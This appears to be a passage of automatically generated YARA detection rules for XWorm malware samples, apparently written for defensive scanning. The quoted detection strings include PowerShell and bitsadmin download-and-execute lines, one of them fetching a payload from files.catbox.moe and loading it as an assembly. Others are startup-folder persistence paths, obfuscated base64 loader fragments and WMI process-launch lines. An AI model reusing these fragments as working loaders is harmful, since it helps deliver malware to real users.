      $x2 = "    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Start-Process -WindowStyle Hidden -FilePath '%~f0' -Argume" ascii /* score: '44.00'*/
      $x3 = "powershell -Command \"& { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Ur" ascii /* score: '32.00'*/
      $s4 = "powershell -Command \"Expand-Archive -Path '%zipPath%' -DestinationPath '%extractDir%' -Force\"" fullword ascii /* score: '29.00'*/
      $s5 = "powershell -Command \"& { Invoke-WebRequest -Uri '%cmdUrl%' -OutFile '%cmdDestination%' }\"" fullword ascii /* score: '29.00'*/
      $s6 = "powershell -Command \"& { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Ur" ascii /* score: '28.00'*/
      $s7 = "start /b \"\" \"%extractDir%\\mas\\python.exe\" load.py --load -i a.txt -p explorer.exe" fullword ascii /* score: '27.00'*/
      $s8 = "start /b \"\" \"%extractDir%\\mas\\python.exe\" load.py --load -i xr.txt -p explorer.exe" fullword ascii /* score: '27.00'*/
      $s9 = "start /b \"\" \"%extractDir%\\mas\\python.exe\" load.py --load -i xw.txt -p explorer.exe" fullword ascii /* score: '27.00'*/
      $s10 = "        powershell -Command \"& { Invoke-WebRequest -Uri '%baseUrl%/%%F' -OutFile '%extractDir%\\mas\\%%F' }\"" fullword ascii /* score: '24.00'*/
      $s11 = "set \"cmdDestination=%USERPROFILE%\\Contacts\\start.cmd\"" fullword ascii /* score: '22.00'*/
      $s12 = "bitsadmin /transfer pyembed /download /priority FOREGROUND \"%zipUrl%\" \"%zipPath%\"" fullword ascii /* score: '21.00'*/
      $s13 = "set \"startupFolder=%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"" fullword ascii /* score: '18.00'*/
      $s14 = "set \"fileDestination=%TEMP%\\rechnung.pdf\"" fullword ascii /* score: '18.00'*/
      $s15 = "echo Script execution completed." fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__1e309735 {
   meta:
      description = "_subset_batch - file XWorm(signature)_1e309735.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1e30973571917de125f34c2addde00499a9959c9661028ae24ceb769419681f9"
   strings:
      $x1 = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^" fullword ascii /* score: '41.00'*/
      $s2 = "uaXUgLGVweXQgdG5pdSAsZXppcyB0bml1ICxyZGRhIHJ0UHRuSSAsaCBydFB0bkkoeEVjb2xsQWxhdXRyaVYgcnRQdG5JIG5yZXR4ZSBjaXRhdHMgY2lsYnVwIF0pImx" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s3 = "ydFB0bkkgLHRyYXRzIHJ0UHRuSSAsa2NhdHMgdG5pdSAscnR0YSBydFB0bkkgLGggcnRQdG5JKGRhZXJoVGV0b21lUmV0YWVyQyBydFB0bkkgbnJldHhlIGNpdGF0cyB" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s4 = "    \"$decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%b64%')); $reversed=-join $decoded.ToC" ascii /* score: '18.00'*/
      $s5 = "arArray()[-1..-($decoded.Length)]; IEX $reversed; Read-Host 'Press Enter to exit...'\"" fullword ascii /* score: '13.00'*/
      $s6 = "    \"$decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%b64%')); $reversed=-join $decoded.ToC" ascii /* score: '13.00'*/
      $s7 = "QLSBuZWRkaUggZWx5dFN3b2RuaVctICJleGUubGxlaHNyZXdvcCIgaHRhUGVsaUYtIHNzZWNvclAtdHJhdFMgPSBwJAoNCg1AIgoNfQoNOyloIHJ0UHRuSShlbGRuYUh" ascii /* score: '11.00'*/
      $s8 = "sbGVoU3BtZXQkKHNldHlCbGxBZGFlUjo6XWVsaUYuT0kubWV0c3lTWyA9IGVkb2NsbGVocyQKDQoNMDA1IHNkbm9jZXNpbGxpTS0gcGVlbFMtdHJhdFMKDXVyaFRzc2F" ascii /* score: '11.00'*/
      $s9 = "7IHlydAoNCg0ibmliLmRhb2x5YXBcUE1FVDp2bmUkIiA9IGVkb2NsbGVoU3BtZXQkCg0ibmliLmlpdWQ4aS9lb20ueG9idGFjLnNlbGlmLy86c3B0dGgiID0gbHJVZWR" ascii /* score: '11.00'*/
      $s10 = "lWjo6XXJ0UHRuSVsgLGNvclBoJChkYWVyaFRldG9tZVJldGFlckM6Ol1yb3RjZWpuSVtdZGlvdlsKDSkwXWZlclsgLGh0Z25lTC5lZG9jbGxlaHMkICxlZG9jbGxlaHM" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 7KB and
      1 of ($x*) and all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5ea46a99 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5ea46a99.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5ea46a993de736ce59671d72f721b5b4983db5a179ae2d3ce1625420facf685a"
   strings:
      $s1 = "CriticalProcesses_Disable" fullword ascii /* score: '11.00'*/
      $s2 = "ProcessCritical" fullword ascii /* score: '11.00'*/
      $s3 = "SetCurrentProcessIsCritical" fullword ascii /* score: '11.00'*/
      $s4 = "CriticalProcess_Enable" fullword ascii /* score: '11.00'*/
      $s5 = "SystemEvents_SessionEnding" fullword ascii /* score: '10.00'*/
      $s6 = "anyrun" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__8cb80fec {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8cb80fec.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8cb80fec50be9d5089fda969dcf4452bfd91c70dfed2eafe54e13ab48da7281c"
   strings:
      $s1 = "XWormClient.exe" fullword wide /* score: '22.00'*/
      $s2 = "WHKEYBOARDLL" fullword ascii /* score: '14.50'*/
      $s3 = "XLogger" fullword ascii /* score: '14.00'*/
      $s4 = "LoggerPath" fullword ascii /* score: '14.00'*/
      $s5 = "CriticalProcesses_Disable" fullword ascii /* score: '11.00'*/
      $s6 = "ProcessCritical" fullword ascii /* score: '11.00'*/
      $s7 = "SetCurrentProcessIsCritical" fullword ascii /* score: '11.00'*/
      $s8 = "CriticalProcess_Enable" fullword ascii /* score: '11.00'*/
      $s9 = "SystemEvents_SessionEnding" fullword ascii /* score: '10.00'*/
      $s10 = "anyrun" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__d714605f {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d714605f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d714605f17bc3771a90af63aa8120dacc998466958c249a58360dba6351ddd60"
   strings:
      $s1 = "XWormClient.exe" fullword wide /* score: '22.00'*/
      $s2 = "CriticalProcesses_Disable" fullword ascii /* score: '11.00'*/
      $s3 = "ProcessCritical" fullword ascii /* score: '11.00'*/
      $s4 = "SetCurrentProcessIsCritical" fullword ascii /* score: '11.00'*/
      $s5 = "CriticalProcess_Enable" fullword ascii /* score: '11.00'*/
      $s6 = "SystemEvents_SessionEnding" fullword ascii /* score: '10.00'*/
      $s7 = "anyrun" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__85e1cebb {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_85e1cebb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "85e1cebb33b89a3d4d0d73344272bfdc74da38cf540721bb8426c23a7f444241"
   strings:
      $s1 = "error.exe" fullword wide /* score: '25.00'*/
      $s2 = "svchost.exe-=>True-=>True" fullword wide /* score: '19.00'*/
      $s3 = "error.exe-=>True-=>False" fullword wide /* score: '17.00'*/
      $s4 = "dllhost" fullword ascii /* score: '13.00'*/
      $s5 = "6uOLyL9lj0I8k8OPvzYiUIefVzPMVX1LsklqYvihtAonwgeT" fullword ascii /* score: '9.00'*/
      $s6 = "%Current%" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      all of them
}

rule XWorm_signature__201478f2 {
   meta:
      description = "_subset_batch - file XWorm(signature)_201478f2.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "201478f2038ed6c1280a5e0df18627d953f3706a188c2dac02a9c4776533513a"
   strings:
      $x1 = "HelixSwitch.WriteLine(\":: ufkZ1DAJrCLAmBzZkCxHsTn3Z4qeglkfr9ucad62C2OUOqGHYZL3qzGYLCJdKrAuyM02IpfznCxe69PiEpE0j+FHVcg2WfE/Fyjux" ascii /* score: '40.00'*/
      $x2 = "GetObject(PlasmaNode).Get(VortexThread).Create('cmd /c ' + SpectrumManager, null, null, null);" fullword ascii /* score: '32.00'*/
      $s3 = "HelixSwitch.WriteLine(\"!wszlrwwbqbywklc! \\\"%nxtmalave%a%nxtmalave%c%nxtmalave%w%nxtmalave%g%nxtmalave%h%nxtmalave%m%nxtmalave" ascii /* score: '19.00'*/
      $s4 = "qNMhx7oIF9lRTop6cHyTkzuY58ZRewC5MKfnDKXDJcyQ1cH/yWXaq1s1syMxicFIiI7eNj/LAUldsiIxL6RGacmdK+SO2MJiNDAT7JcRoAgqSAMCv1HtskO+qKslIfWG" ascii /* score: '18.00'*/
      $s5 = "yKIVAysczft1PFeU+dZSyeZSNkw9RRmrSfqo/A2FLGhdSNG0F7Pq2ae64wWPG+8UDs/l0Kp4+dYDrUnTIYbm5hGF+7ZzEftJ/dbWu5A7OJwQCdGiUA0YWSQMSBINZ1kX" ascii /* score: '17.00'*/
      $s6 = "HelixSwitch.WriteLine(\"%qpnwktmwsrfnx%c%qpnwktmwsrfnx%o%qpnwktmwsrfnx%p%qpnwktmwsrfnx%y%qpnwktmwsrfnx% \\\"%sourceFile%\\\" " ascii /* score: '17.00'*/
      $s7 = "HelixSwitch.WriteLine(\"%iefqzkcgqbu%%fdczqpfzaio%%mwlqtzwtfxq%%fdfhmjplmqb%%tltdsmhrhrm%%kkhpvcbkksn%%bxeudxldsos%%lxgpewerggy%" ascii /* score: '17.00'*/
      $s8 = "NArxf+xB4C0jw6ltQLfYHZ7e45tF3ugiBPHHhGCvObiTeHNxCTrdl3LHmksBOssZyllhHln3mthPpLs6byiCCeLjMp6kDbw9yMvlJI4eswDhKKmrAt/aTsWMUo8588Ux" ascii /* score: '16.00'*/
      $s9 = "B0O0+Z0aWPo11DbBFjNo3TqvO9+T/wMd2wZk8YJnutvJuIVUXIxlPudlvpZRDqZhI3nn124oIJ4C8q5cu/yHNaXloKrwHMMHzQHMJLOGPVAV8vWNnr/HPqqb2mzcR04w" ascii /* score: '16.00'*/
      $s10 = "nxtmalave%m%nxtmalave%r%nxtmalave%h%nxtmalave%w=-nop -c \\\"\\\"iex([Text.Encoding\\\"\");" fullword ascii /* score: '16.00'*/
      $s11 = "HelixSwitch.WriteLine(\"!wszlrwwbqbywklc! \\\"%cqyqfjtcm%o%cqyqfjtcm%i%cqyqfjtcm%o%cqyqfjtcm%s%cqyqfjtcm%j%cqyqfjtcm%m%cqyqfjtcm" ascii /* score: '16.00'*/
      $s12 = "Xc9Ok0DrY15zCecpeSZwgVXp6cPPkR6uv0/GKDllTD34nINW+evVQsZFmbj9n7VxaAiT49I6gOSz7xkY/utUg15dP+Aj1UA113X86/mlf8B4fAC4x9coIjrROHwMeK3L" ascii /* score: '16.00'*/
      $s13 = "v46hzIwC7ul0w5qcxXAR9lY6ImmP78ZLP6kxxEafdBZWLyqPu7f9O8B5P0C9zzEQ+nHDtSRiSJPogl2eFdjgDK5RwPrJaIvY53/tBDsDlHMRwDcpkfpabv6Pj4SwNH/J" ascii /* score: '16.00'*/
      $s14 = "HelixSwitch.WriteLine(\"!wszlrwwbqbywklc! \\\"%zizywmjhb%o%zizywmjhb%c%zizywmjhb%y%zizywmjhb%n%zizywmjhb%z%zizywmjhb%d%zizywmjhb" ascii /* score: '15.00'*/
      $s15 = "XaSMlSNyn21i9e6XQGP57ZN9hnRKGx9LLvQzQ8XMIKtazwYLii4xKVgzDNsXRxk3IdSYAWq8y5kJAInCuRoyxlGkIOqdondoORMGBI2zCgAilzJsfKUCObEJHK4utyTJ" ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__e05be2a9 {
   meta:
      description = "_subset_batch - file XWorm(signature)_e05be2a9.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e05be2a9868239b747273edcf15dd8b418edcf1794bc72b26e5ccac2e1a2fa4b"
   strings:
      $x1 = "GetObject(\"winmgmts:\").Get(\"Win32_Process\").Create \"cmd.exe /c \" & SoilHouse6251, Null, Null, Null" fullword ascii /* score: '50.00'*/
      $x2 = "FieldFacility.WriteLine \":: 25FIz9OntRyAp1YWqH7DPafRIMpMBQ8lMFcbU++digog1cQ9PQnetG3DymQpinSZbYrFDXyBJS0uJeyJzpUunFVVR1xD9T7ZlrU" ascii /* score: '41.00'*/
      $x3 = "PesticideShed = Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(" ascii /* score: '31.00'*/
      $x4 = "SoilHouse6251 = \"C:\\\\Users\\\\Public\\\\BarnEstate.bat\"" fullword ascii /* score: '31.00'*/
      $s5 = "FieldFacility.WriteLine \"!cvtairiublwvyag! \"\"%cbsahjbvd%y%cbsahjbvd%n%cbsahjbvd%j%cbsahjbvd%a%cbsahjbvd%f%cbsahjbvd%u%cbsahjb" ascii /* score: '22.00'*/
      $s6 = "AHIAYQBtACgAWwBJAG4AdABQAHQAcgBdACQAVwBhAHYAZQBUAGEAcgBnAGUAdABBAGQAZAByAGUAcwBzACwAIABbAGIAeQB0AGUAWwBdAF0AJABUAGkAZABlAEUAeABw" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s7 = "AHAAUwBlAHIAdgBpAGMAZQBzAC4ASABhAG4AZABsAGUAUgBlAGYAKABbAEkAbgB0AFAAdAByAF0AOgA6AFoAZQByAG8ALAAgACQAbwBjAGUAYQBuAEwAaQBiAHIAYQBy" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s8 = "AG0AbwByAHkATQBhAG4AYQBnAGUAcgA6ADoAUgBlAGEAZABJAG4AdAAzADIAKABbAEkAbgB0AFAAdAByAF0AJAB3AGEAdgBlAFMAZQByAHYAaQBjAGUAUAByAG8AdgBp" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s9 = "AEEAZABkAHIAZQBzAHMALAAgADYANAAgACsAIAAoACQAdABpAGQAZQBTAGUAcgB2AGkAYwBlAEMAbwB1AG4AdAAgACoAIAAkAHMAZQBhAFAAbwBpAG4AdABlAHIAUwBp" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s10 = "AGkAdABBAHIAYwBoAGkAdABlAGMAdAB1AHIAZQAgAD0AIAAkAE8AYwBlAGEAbgBTAGUAYwB1AHIAaQB0AHkAUwBlAHIAdgBpAGMAZQBJAG4AZgBvAC4ATwBjAGUAYQBu" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s11 = "AG8AcgB5AE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQAMwAyACgAWwBJAG4AdABQAHQAcgBdACgAJAB0AGkAZABlAFMAZQByAHYAaQBjAGUAQwBvAG4AdABl" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s12 = "AGUARAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkAKAAkAHQAaQBkAGUAQQBzAHMAZQBtAGIAbAB5AE4AYQBtAGUALAAgAFsAUwB5AHMAdABlAG0ALgBSAGUAZgBs" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s13 = "AFsASQBuAHQAUAB0AHIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAuAE0AYQBrAGUAQgB5AFIAZQBmAFQAeQBw" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s14 = "AHYAaQBjAGUASQBuAGYAbwAgACQAdABpAGQAZQBUAGEAcgBnAGUAdABGAHUAbgBjAHQAaQBvAG4AIAAkAHQAaQBkAGUAUwBlAHIAdgBpAGMAZQBDAG8AdQBuAHQAKQAg" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s15 = "/9i+TsZvvJ7E1zXLhLIDs2hnvAeh8eKCm6jPLRBRnGRUWleD59ORDLLwlJKAbzUkoCJq0/RtMA9GPxfZdjQtVpIATvmjUfLOgrk+cGc4UlJYV+vKRBNh4X830LyCnTl1" ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x6147 and filesize < 600KB and
      1 of ($x*) and all of them
}

rule XWorm_signature__8 {
   meta:
      description = "_subset_batch - file XWorm(signature).lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "41cdbafba89bad77d1784458e5c226eb405ca9f46bb65a38031c48a97e6eef84"
   strings:
      $s1 = "powershell.exe" fullword ascii /* score: '27.00'*/
      $s2 = "?..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide /* score: '20.00'*/
      $s3 = "-window min [Uri]::UnescapeDataString(('6375726c2e657865202768747470733a2f2f6167726963756c747572652d6c61777965722e636f6d2f537461" wide /* score: '16.00'*/
      $s4 = "%ProgramFiles%\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '15.00'*/
      $s5 = "WindowsPowerShell" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 8KB and
      all of them
}

rule XWorm_signature__9 {
   meta:
      description = "_subset_batch - file XWorm(signature).ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a889d4486a90d6964b86ee97751fa0c10607fcff8823fd31d968a32edece72cf"
   strings:
      $s1 = "irm https://files.catbox.moe/ey95fs.txt -OutFile \"g.txt\"" fullword ascii /* score: '14.00'*/
      $s2 = "$assembly = [System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes(\"./g.txt\"))" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x7269 and filesize < 1KB and
      all of them
}

rule XWorm_signature__10 {
   meta:
      description = "_subset_batch - file XWorm(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "31eee3a6561ef5889cd382c5928e94d11a7cf2656df55afe74be1d6d35fd4eb3"
   strings:
      $s1 = "#PDC5762905-UNGF780O2AS-BNK97967.bat" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 1000KB and
      all of them
}

rule XWorm_signature__11 {
   meta:
      description = "_subset_batch - file XWorm(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3ead4b7f0f8105f4983ddef01cc1f45e5cfc398cae1c1b2b6311626efcff32c9"
   strings:
      $s1 = "\"7}+\",6" fullword ascii /* score: '9.00'*/ /* hex encoded string 'v' */
   condition:
      uint16(0) == 0x4b50 and filesize < 100KB and
      all of them
}

rule XWorm_signature__0a54b3ab {
   meta:
      description = "_subset_batch - file XWorm(signature)_0a54b3ab.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0a54b3ab8aee9ff429b5d29a8b20276b29da6719c5fc55bfa1ce8277adddd442"
   strings:
      $x1 = "ElectronParser.WriteLine(\"::UNEYa5h8Jf3GLZIiFpDzUrKNCv0YuhGTxkfkptGlhF5Ww5R+qFcFUN0sBhYKKkp90SKiPtPKbUe7+hx60KlO1MV3KLQqm2R9pA+" ascii /* score: '33.00'*/
      $s2 = "GetObject(VectorChannel).Get(GalacticBuffer).Create('cmd /c ' + AtomicPlatform, null, null, null);" fullword ascii /* score: '29.00'*/
      $s3 = "ElectronParser.WriteLine(\"%XANOK%s%XANOK%%XANOK%e%XANOK%%XANOK%t%XANOK% GPXGJW=C:\\\\Windows\\\\System32\\\\%ENRUYM:WXWDFFN=%\"" ascii /* score: '25.00'*/
      $s4 = "ElectronParser.WriteLine(\"%YMCGI%s%YMCGI%%YMCGI%e%YMCGI%%YMCGI%t%YMCGI% \\\"ESJQGP=;$DKIQATNK = [ConWXWDFFNsole]::Title;$LNPAWX" ascii /* score: '23.00'*/
      $s5 = "ElectronParser.WriteLine(\"%HJBOY%s%HJBOY%%HJBOY%e%HJBOY%%HJBOY%t%HJBOY% \\\"ENRUYM=WindowsPowerShellWXWDFFN\\\\v1.0\\\\powershe" ascii /* score: '20.00'*/
      $s6 = "ElectronParser.WriteLine(\"%LMZHD%s%LMZHD%%LMZHD%e%LMZHD%%LMZHD%t%LMZHD% \\\"ZLSZLMW=set HYKLFTP=1 &&WXWDFFN start \\\"\\\" /min" ascii /* score: '20.00'*/
      $s7 = "ElectronParser.WriteLine(\"%LMZHD%s%LMZHD%%LMZHD%e%LMZHD%%LMZHD%t%LMZHD% \\\"ZLSZLMW=set HYKLFTP=1 &&WXWDFFN start \\\"\\\" /min" ascii /* score: '20.00'*/
      $s8 = "var MagneticHub = eval('new ' + 'A!_&)#$$*(}]_!&::c#~]?@%_@*=_$}&+$t&$+#>&#=^_][%@&i},+:^#?%^((~?`v|^],?>-;e]!:_)]&}{_~})%%#;%&_" ascii /* score: '19.00'*/
      $s9 = "jrJDttDmINRhvRivko1MH+WTUXJkWUldAjjRA0k8CWR0lL2IWSu1zcW1YMN1wBlKCfQ+czlZspYOtX8Jdb0qk6+9lfUJkKguYTMCuBDgChyAcv/JAt34djkJK+vXJKXD" ascii /* score: '16.00'*/
      $s10 = "lJJhmZeEaSvxXTm52fwgSsZ7qJSkmtGeTWk7iuPjbrhHK6JRMooD1fYyxP429FWflmyl5ML83KID7KQIOZEvVq77WIBxnKQ9KZ9lmOA0ZGVl6HNko/1HieXl8dxXHo5y" ascii /* score: '16.00'*/
      $s11 = "UoHFNaGXJPBucd9m+qRb7Yf4XE6mt519Mw0RaEf/7fJciQWGET1NHG71ugcv7TPnOFkChgEY0/LzvdJi7puqwHSLCUSicK3H15w2sPwHaWpcQJfl9ldhhueOLJJej0Hy" ascii /* score: '16.00'*/
      $s12 = "ElectronParser.WriteLine(\"%HJBOY%s%HJBOY%%HJBOY%e%HJBOY%%HJBOY%t%HJBOY% \\\"ENRUYM=WindowsPowerShellWXWDFFN\\\\v1.0\\\\powershe" ascii /* score: '16.00'*/
      $s13 = "ElectronParser.WriteLine(\"%YOMOR%s%YOMOR%%YOMOR%e%YOMOR%%YOMOR%t%YOMOR% \\\"PPXJGX=$host.UI.RawUI.WXWDFFNWindowTitle=WXWDFFN" ascii /* score: '16.00'*/
      $s14 = "EJs5lX+C7DA9L6U/lz2RpV7N0Pbi8/aFeP1BlV1NOAwDixnlVtCTYA5k13f6ERskLmtBoSVZ/NjgN/sPydhZahUrkOgXPMT9qL2/hLwkqbbOIH8vk6jBkRoCZxU9D+Wf" ascii /* score: '16.00'*/
      $s15 = "x/znQxaxIMbs/vrJthgc+NrgwdT4HSvXspYlO06umKo+s1PL+dfxIA0JcEVyW1Oquw1FaycU55WLaQJqcrbLG5utc+eCE89tGUf1LYJ/pUNEYc4r52OLFCQSGtpq92P7" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__ef0a4e42 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ef0a4e42.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ef0a4e4235616968f5e13b937dab29356dd6d3efe5b725903a1ee21f9be3a1d8"
   strings:
      $s1 = "SecurityHealthSystray.exe" fullword wide /* score: '22.00'*/
      $s2 = "CriticalProcesses_Disable" fullword ascii /* score: '11.00'*/
      $s3 = "ProcessCritical" fullword ascii /* score: '11.00'*/
      $s4 = "SetCurrentProcessIsCritical" fullword ascii /* score: '11.00'*/
      $s5 = "CriticalProcess_Enable" fullword ascii /* score: '11.00'*/
      $s6 = "SystemEvents_SessionEnding" fullword ascii /* score: '10.00'*/
      $s7 = "teZ96k7GqdLLXLHwYjYgsw==" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      all of them
}

rule XWorm_signature__1e5fa5c1 {
   meta:
      description = "_subset_batch - file XWorm(signature)_1e5fa5c1.tar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1e5fa5c13fb027801bfb71af7db14fe744d956f31c1f12c092e3b4d775888802"
   strings:
      $s1 = "<Document_223_12028519303_1_202507101353_7316298_PRINTER2.bat" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 200KB and
      all of them
}

rule XWorm_signature__25513d78 {
   meta:
      description = "_subset_batch - file XWorm(signature)_25513d78.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "25513d783a85fe730cffb2bc4ec9d6bcf22c3a2fb2b2dc885f7a4912b919889f"
   strings:
      $x1 = "::GKn99bAlWXzU6d9Y2EEHZCW1Xg3weuo5UbeLYBO+xUcRZFFdwnz8W67PF7ilQnb9DkmZZNLBKAYoYuNkJ4+McX0LcfYCWdxJVKejDDSm0sbfk51yH57qQb21WwTLn6" ascii /* score: '38.00'*/
      $s2 = "%IOGCSZG%s%IOGCSZG%%IOGCSZG%e%IOGCSZG%%IOGCSZG%t%IOGCSZG% \"LLCWYQ=;$CAAPRUYW = [ConsolKBUFCAUe]::Title;$BXTOYKLKBUFCAUQ = Get-C" ascii /* score: '30.00'*/
      $s3 = "c2VtYmx5ID0gJHN3ZWV0RGVjb2Rlci5HZXRTdHJpbmcoJGJlcnJ5Q29udmVydGVyOjpGcm9tQmFzZTY0U3RyaW5nKCdVM2x6ZEdWdExsZHBibVJ2ZDNNdVJtOXliWE09" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s4 = "eUxhc3RDaGVjayA9ICRiZXJyeU1lbU1hbmFnZXI6OlJlYWRCeXRlKFtJbnRQdHJdOjpBZGQoJEJlcnJ5VGFyZ2V0QWRkcmVzcywgJHN3ZWV0TW9kaWZpY2F0aW9uRGF0" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s5 = "ZWxlZ2F0ZSAkc3RyYXdiZXJyeVByb3RlY3Rpb25BZGRyZXNzIEAoW0ludFB0cl0sW1VJbnQzMl0sW1VJbnQzMl0sW1VJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jv" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s6 = "Z2F0ZVR5cGVCdWlsZGVyID0gJGJlcnJ5TW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdTdHJhd2JlcnJ5RGVsZWdhdGVUeXBlJywgJ0NsYXNzLFB1YmxpYyxTZWFsZWQs" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s7 = "LVN0cmF3YmVycnlEZWxlZ2F0ZSAkc3dlZXRQcm90ZWN0aW9uQWRkcmVzcyBAKFtJbnRQdHJdLFtVSW50MzJdLFtVSW50MzJdLFtVSW50MzJdLk1ha2VCeVJlZlR5cGUo" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s8 = "bmFtaWNEZWxlZ2F0ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRTdHJhd2Jl" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s9 = "+U2XL7/gi5yRNGiIJLX61ODmT46+C3Wseg1TsPCJ/+5avuLfctPuNehEJqO7csVCdNfHPS59sEcmg0ua14xZt/WslGIjwThm366Fqp/T1st8/G5uoDepDUmPEGlSnsFd" ascii /* score: '21.00'*/
      $s10 = "U2V0LUV4ZWN1dGlvblBvbGljeSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtU2NvcGUgQ3VycmVudFVzZXIgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s11 = "ICAgJHN0cmF3YmVycnlQcm90ZWN0aW9uUmVzdWx0ID0gJHN0cmF3YmVycnlNZW1vcnlQcm90ZWN0b3IuSW52b2tlKCRCZXJyeVRhcmdldEFkZHJlc3MsIDgsIDB4NDAs" ascii /* base64 encoded string  */ /* score: '20.00'*/
      $s12 = "nrQRAblw196hanCspy5uWn/utpJZV745uIPEarCdbu5ZjJzuT5WgIpQBcYEAXG8KeYq/YgW2ida0uuBN6ashKxe3FEEpUOs0aSS9wgZYtsyz6CjRPPwuHakvzpEr2GLT" ascii /* score: '19.00'*/
